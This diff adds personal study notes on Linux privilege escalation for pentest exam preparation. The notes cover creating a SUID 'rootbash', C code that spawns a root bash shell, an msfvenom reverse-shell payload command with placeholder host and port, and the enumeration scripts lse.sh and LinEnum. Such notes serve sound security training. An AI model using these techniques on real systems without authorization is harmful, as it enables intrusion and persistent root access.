@@ -118,26 +118,92 @@ Gid: 1000 0 0 0
 
 -- Spawning Root Shells --
 
+Our ultimate goal is to spawn a root shell. 
+While the end result is the same (executing /bin/sh or /bin/bash), there are multiple ways of achieving this execution.
+
+• "rootbash" SUID
+• Custom Executable
+• msfvenom
+• Native Reverse Shells
+• Privilege Escalation Tools
+
+➜ "rootbash" SUID
+
+One of ways to spawn a root shell is to create a copy of the /bin/bash executable file (I usually rename it rootbash), make sure it is owned by the root user, and has the SUID bit set.
+A root shell can be spawned by simply executing the rootbash file with the -p command line option.
+The benefit of this method is it is persistent (once you run the exploit, rootbash can be used multiple times).
+
+➜ Custom Executable
+
+There may be instances where some root process executes another process which you can control. 
+In these cases, the following C code, once compiled, will spawn a Bash shell running as root:
+
+int main() {
+  setuid(0);
+  system("/bin/bash -p");
+}
+
+Compile using: $ gcc -o <name> <filename.c>
+
+➜ msfvenom
+
+Alternatively, if a reverse shell is preferred, msfvenom can be used to generate an executable (.elf) file:
+
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+
+This reverse shell can be caught using netcat or Metasploit’s own multi/handler.
+
+➜ Native Reverse Shells
+
+There are multiple ways to spawn reverse shells natively on many Linux distributions.
+
+A good tool for suggesting these is: https://github.com/mthbernardes/rsg
+
+All can be caught using a simple netcat listener.
+
+➜ Privilege Escalation Tools
+
+While it is always important to understand what tools are doing, they are invaluable in a time-limited setting, such as an exam.
+We will use Linux Smart Enumeration and LinEnum.
+
+• Linux Smart Enumeration
+• LinEnum
+
+➜ Linux Smart Enumeration
+
+Linux Smart Enumeration (lse.sh) has recently become my personal favorite privilege escalation tool.
+In addition to being a Bash script (which helps if Python isn’t installed), it has multiple levels which gradually reveal more and more information.
+
+$ chmod+x lse.sh
+$ ./lse.sh -h
+
+$ ./lse.sh
+$ ./lse.sh -l1 -i
+$ ./lse.sh -l2 -i
+
+➜ LinEnum
+
+LinEnum is an advanced Bash script which extracts a large amount of useful information from the target system.
+It can copy interesting files for export, and search for files containing a keyword (e.g. “password”).
 
 
 
 
+Links
 
+https://github.com/diego-treitos/linux-smart-enumeration
+https://github.com/rebootuser/LinEnum
+
+https://github.com/linted/linuxprivchecker
+https://github.com/AlessandroZ/BeRoot
+http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+
+•
 ➜ 
-➜ 
-➜ 
-➜ 
-➜ 
-➜ 
-➜ 
-➜ 
+⇒
+->
+►
 
 
-
-
-
-
-
-
-
-
+*
